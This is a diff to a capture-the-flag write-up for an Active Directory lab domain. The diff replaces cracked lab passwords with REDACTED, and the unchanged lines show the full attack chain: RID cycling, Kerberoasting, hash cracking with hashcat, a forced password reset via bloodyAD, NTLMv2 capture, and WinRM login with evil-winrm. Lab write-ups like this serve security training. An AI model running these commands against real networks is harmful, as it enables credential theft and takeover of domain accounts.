@@ -105,7 +105,7 @@ The filtered results are a VPN/timing artefact from running nmap without `-Pn` �
 ### User Enumeration via RID Cycling
 
 ```bash
-nxc smb 10.1.130.199 -u 'r.widdleton' -p 'lilronron' --rid-brute
+nxc smb 10.1.130.199 -u 'r.widdleton' -p 'REDACTED' --rid-brute
 ```
 
 Key users discovered:
@@ -121,7 +121,7 @@ Key users discovered:
 ### BloodHound Collection
 
 ```bash
-nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --bloodhound --collection All --dns-server 10.1.130.199
+nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'REDACTED' --bloodhound --collection All --dns-server 10.1.130.199
 ```
 
 Ingest the `.zip` into BloodHound and run the **Kerberoastable Users** query.
@@ -141,7 +141,7 @@ Ingest the `.zip` into BloodHound and run the **Kerberoastable Users** query.
 Request the TGS ticket for `r.haggard`:
 
 ```bash
-impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.1.130.199 -request-user r.haggard -outputfile kerberoast.txt
+impacket-GetUserSPNs buildingmagic.local/r.widdleton:REDACTED -dc-ip 10.1.130.199 -request-user r.haggard -outputfile kerberoast.txt
 ```
 
 ```
@@ -153,7 +153,7 @@ HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:
 Alternative via NetExec:
 
 ```bash
-nxc ldap 10.1.130.199 -u 'r.widdleton' -p 'lilronron' --kerberoasting kerberoast.txt
+nxc ldap 10.1.130.199 -u 'r.widdleton' -p 'REDACTED' --kerberoasting kerberoast.txt
 ```
 
 Crack offline with Hashcat (`-m 13100` = `krb5tgs` RC4-HMAC):
@@ -162,12 +162,12 @@ Crack offline with Hashcat (`-m 13100` = `krb5tgs` RC4-HMAC):
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Cracked:** `r.haggard : rubeushagrid`
+**Cracked:** `r.haggard : REDACTED`
 
 ### Checking r.haggard's Shares
 
 ```bash
-nxc smb buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' --shares
+nxc smb buildingmagic.local -u 'r.haggard' -p 'REDACTED' --shares
 ```
 
 ```
@@ -178,7 +178,7 @@ SYSVOL    READ
 Check SYSVOL for GPP passwords (Group Policy Preferences XML files containing `cpassword` fields encrypted with a key Microsoft published in 2012 — trivially crackable):
 
 ```bash
-nxc smb buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' -M gpp_password
+nxc smb buildingmagic.local -u 'r.haggard' -p 'REDACTED' -M gpp_password
 ```
 
 Nothing found — moving on.
@@ -194,7 +194,7 @@ BloodHound shows the exact command to abuse this right:
 `r.haggard` has `ForcePasswordChange` rights over `h.potch`, allowing us to set a new password without knowing the current one:
 
 ```bash
-bloodyAD -u r.haggard -p rubeushagrid -d buildingmagic.local -H 10.1.130.199 set password h.potch 'NewPass123!'
+bloodyAD -u r.haggard -p REDACTED -d buildingmagic.local -H 10.1.130.199 set password h.potch 'NewPass123!'
 ```
 
 ```
@@ -262,7 +262,7 @@ Copy the full hash line from Responder output into `ntlmv2.txt`, then crack it:
 hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Cracked:** `h.grangon : magic4ever`
+**Cracked:** `h.grangon : REDACTED`
 
 ---
 
@@ -273,15 +273,15 @@ BloodHound confirms `h.grangon` is a member of **Remote Management Users**.
 ![BloodHound — h.grangon Remote Management Users](screenshots/bloodhound-remote-management.png)
 
 ```bash
-nxc winrm 10.1.130.199 -u 'h.grangon' -p 'magic4ever'
+nxc winrm 10.1.130.199 -u 'h.grangon' -p 'REDACTED'
 ```
 
 ```
-[+] BUILDINGMAGIC.LOCAL\h.grangon:magic4ever (Pwn3d!)
+[+] BUILDINGMAGIC.LOCAL\h.grangon:REDACTED (Pwn3d!)
 ```
 
 ```bash
-evil-winrm -i 10.1.130.199 -u 'h.grangon' -p 'magic4ever'
+evil-winrm -i 10.1.130.199 -u 'h.grangon' -p 'REDACTED'
 ```
 
 ### User Flag
